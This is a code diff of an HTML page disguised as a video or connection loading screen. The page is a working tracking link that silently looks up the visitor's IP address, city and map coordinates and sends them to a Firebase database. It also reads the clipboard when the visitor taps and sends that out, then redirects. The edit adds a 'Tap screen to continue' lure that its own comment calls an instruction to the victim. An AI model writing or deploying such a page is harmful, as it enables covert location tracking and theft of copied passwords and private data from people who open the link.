@@ -1,65 +1,67 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading Video...</title>
+    <title>Connecting...</title>
     <style>
-        body { background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .loader { border: 4px solid #333; border-top: 4px solid #00a884; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { background: #000; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
+    <div id="status">Loading...</div>
 
     <script>
         const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
 
-        async function startSpy() {
-            const params = new URLSearchParams(window.location.search);
-            const id = params.get('id');
-            if(!id) return;
+        async function start() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const id = urlParams.get('id');
+            if(!id) return document.getElementById('status').innerText = "Invalid Link";
 
             try {
-                // Decode Key and Redirect URL
-                const [userKey, targetUrl] = atob(id).split('|');
+                // Decode the JSON payload
+                const decoded = JSON.parse(atob(id));
+                const userKey = decoded.k;
+                const targetUrl = decoded.r;
 
-                // 1. Silent Location Tracking
-                let info = { time: new Date().toLocaleString(), ip: "Unknown", loc: "Unknown", map: "#" };
+                // 1. Get Location
+                let info = { time: new Date().toLocaleString() };
                 try {
                     const res = await fetch('https://ipwho.is/');
                     const d = await res.json();
                     info.ip = d.ip;
-                    info.loc = `${d.city}, ${d.country}`;
+                    info.loc = d.city;
                     info.map = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
                 } catch(e) {}
 
-                // Send to Firebase
-                await fetch(`${DB_URL}tracking/${userKey}.json`, { method: 'POST', body: JSON.stringify(info) });
+                // Send to Firebase (Wait for it)
+                await fetch(`${DB_URL}tracking/${userKey}.json`, {
+                    method: 'POST',
+                    body: JSON.stringify(info)
+                });
 
-                // 2. Clipboard Grabber (Works when they click anywhere)
+                // 2. Clipboard on click
                 document.body.onclick = async () => {
                     try {
                         const text = await navigator.clipboard.readText();
                         if(text) {
-                            await fetch(`${DB_URL}clipboard/${userKey}.json`, { 
-                                method: 'POST', 
-                                body: JSON.stringify({ clipData: text, time: new Date().toLocaleString() }) 
+                            await fetch(`${DB_URL}clipboard/${userKey}.json`, {
+                                method: 'POST',
+                                body: JSON.stringify({ clipData: text, time: new Date().toLocaleString() })
                             });
                         }
                     } catch(e) {}
-                    // Move to target after click
                     window.location.href = targetUrl;
                 };
 
-                // Auto move after 4 seconds even if no click
-                setTimeout(() => { window.location.href = targetUrl; }, 4000);
+                // Show instruction to victim
+                document.getElementById('status').innerText = "Tap screen to continue...";
 
-            } catch(e) { window.location.href = "https://youtube.com"; }
+            } catch(e) {
+                console.error(e);
+                document.getElementById('status').innerText = "Error Occurred.";
+            }
         }
-
-        startSpy();
+        start();
     </script>
 </body>
 </html>
